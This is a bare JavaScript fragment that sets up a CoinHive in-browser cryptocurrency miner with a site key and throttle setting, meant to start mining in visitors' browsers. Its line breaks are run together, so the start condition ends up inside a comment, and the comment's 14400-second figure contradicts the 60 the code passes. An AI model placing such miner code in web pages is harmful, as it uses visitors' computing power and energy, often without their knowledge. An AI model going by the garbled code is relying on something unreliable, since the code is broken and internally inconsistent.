var miner = new CoinHive.Anonymous('5vYMd4VtQcZpt2hiffVBLPL9eU50vjQq', {
    throttle: 0.3
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.didOptOut(60)) {miner.start();}